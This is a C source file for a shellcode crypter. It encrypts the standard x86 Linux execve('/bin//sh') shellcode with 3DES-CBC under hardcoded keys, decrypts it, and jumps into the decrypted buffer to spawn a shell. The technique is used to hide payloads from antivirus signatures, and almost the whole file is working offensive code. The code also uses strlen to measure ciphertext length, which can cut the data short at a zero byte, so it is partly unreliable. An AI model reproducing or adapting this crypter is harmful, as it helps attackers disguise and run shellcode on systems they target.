/*
Author:	  evoche
License:  GPL
*/

#include <stdio.h>
#include <string.h>
#include </usr/include/openssl/des.h>
#include </usr/include/openssl/rand.h>

#define BUFSIZE 512
#define PLAINTEXT "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
#define KEY1 {212, 8, 120, 55, 45, 98, 33, 25}
#define KEY2 {111, 44, 134, 55, 2, 200, 66, 199}
#define KEY3 {25, 231, 54, 255, 45, 81, 77, 111}
#define IV {25, 231, 5, 255, 45, 3, 77, 111}

int main(void)
{
	char plaintxt[] = PLAINTEXT;
	int lenplaintxt = strlen((char*)plaintxt);

	printf("Plaintext: ");
	int i;
    for (i=0; i < lenplaintxt; i++)
	{
        printf("\\x%.2x", (unsigned char)plaintxt[i]);
	}	
	printf("\n\n");

    unsigned char enc[BUFSIZE], dec[BUFSIZE];
 
	//keys are unsigned chars of size 8 (can generate random keys with DES_random_key..)
	DES_cblock key_1 = KEY1;
	DES_cblock key_2 = KEY2;
	DES_cblock key_3 = KEY3;

	//DES_set_key will check that the key passed is of odd parity and is not a week or semi-weak key
	DES_key_schedule ks_1, ks_2, ks_3;
	DES_set_key((const_DES_cblock*)key_1, &ks_1);
    DES_set_key((const_DES_cblock*)key_2, &ks_2);
    DES_set_key((const_DES_cblock*)key_3, &ks_3);

	//Initialisation Vector
	DES_cblock iv = IV;

    //zero memory
    memset(enc, 0, sizeof(enc));
    memset(dec, 0, sizeof(dec));
	
	//encrypt with K1, decrypt with K2, encrypt with K3.
    DES_ede3_cbc_encrypt((const unsigned char*)plaintxt, enc, lenplaintxt, &ks_1, &ks_2, &ks_3, &iv, DES_ENCRYPT);

	//Encryped Text:
	int lenEncryptedTxt = strlen((char*)enc);
	printf("Lenght of Cipher Text: %d \n", lenEncryptedTxt);


	printf("Ciphertext: ");
    for (i=0; i < lenEncryptedTxt; i++)
	{
        printf("\\x%.2x", (unsigned char)enc[i]);
	}	
	printf("\n\n");

	//redefine iv before decrypting the ciphertext otherwise the first 64 bits of the resultant plaintext will be incorrect
	DES_cblock iv_rd = IV;
	
	//decrypt with K3, encrypt with K2, then decrypt with K1
    DES_ede3_cbc_encrypt(enc, dec, lenEncryptedTxt, &ks_1, &ks_2, &ks_3, &iv_rd, DES_DECRYPT);

	int lenDecryptedTxt = strlen((char*)dec);
	
	printf("Decrypted: ");
    for (i=0; i < lenDecryptedTxt; i++)
	{
        printf("\\x%.2x", (unsigned char)dec[i]);
	}	

	printf("\n\nRunning decrypted shellcode...\n\n");

	int (*ret)() = (int(*)())dec;
	ret();
 
    return 0;

}


